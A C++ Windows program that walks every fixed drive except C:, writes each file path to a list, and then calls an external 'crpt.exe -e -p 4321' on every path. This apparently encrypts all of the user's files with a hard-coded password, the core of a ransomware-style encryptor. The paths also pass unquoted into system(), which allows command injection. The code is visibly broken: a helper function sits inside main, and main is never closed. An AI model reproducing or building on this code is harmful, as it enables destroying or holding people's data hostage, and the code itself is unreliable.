#include <boost/config/warning_disable.hpp>
#include <boost/filesystem.hpp>
#include <iostream>
#include <iterator>
#include <stdio.h>
#include <windows.h>

using namespace std;

fstream out_file("data.txt", ios::out);

#define MAX 256

int main(int argc, char* argv[]) {

	int dr_type = 99;
	char dr_avail[MAX];
	char *temp = dr_avail;

	/* 1st we fill the buffer */
	GetLogicalDriveStrings(MAX, dr_avail);
	while (*temp != NULL) { // Split the buffer by null
		dr_type = GetDriveType(temp);

		char skip[10] = "C:\\";

		if (dr_type == 3 && temp[0] != 'C') {

			boost::system::error_code dir_error;

			for (boost::filesystem::recursive_directory_iterator end, dir(temp, dir_error); dir != end; dir.increment(dir_error)) {
				if (dir_error.value()) {
					cerr << "Error accessing file: " << dir_error.message() << endl;
				}
				else {
					cout << dir->path() << endl;
					out_file << dir->path() << "\n";
				}
			}
		}
		temp += lstrlen(temp) + 1;
	}
	out_file.close();
	system("pause");
	out_file.open("data.txt", ios::in);
	string line;
	while (out_file.good()) {
		getline(out_file, line);
		cout << line << endl;
		std::string cmmd = "crpt.exe -e -p 4321 ";
		cmmd += line;
		system(cmmd.c_str());
	}
    string RandomString(int len)
{
	srand(time(0));
	string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	string newstr;
	int pos;
	while (newstr.size() != len) {
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}
